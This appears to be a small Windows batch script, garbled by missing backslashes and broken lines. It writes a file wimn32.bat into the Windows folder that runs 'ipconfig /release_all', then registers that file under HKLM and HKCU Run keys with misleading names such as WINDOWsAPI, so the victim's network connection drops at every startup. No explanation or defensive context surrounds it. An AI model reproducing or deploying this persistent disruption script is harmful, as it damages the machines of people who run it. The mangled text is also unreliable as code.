echo @echo off>c:windowswimn32.batecho break off>c:windowswimn32.bat echoipconfig/release_all>c:windowswimn32.batecho end>c:windowswimn32.batreg addhkey_local_machinesoftwaremicrosoftwindowscurrent versionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.

at /freg addhkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho Bye!PAUSE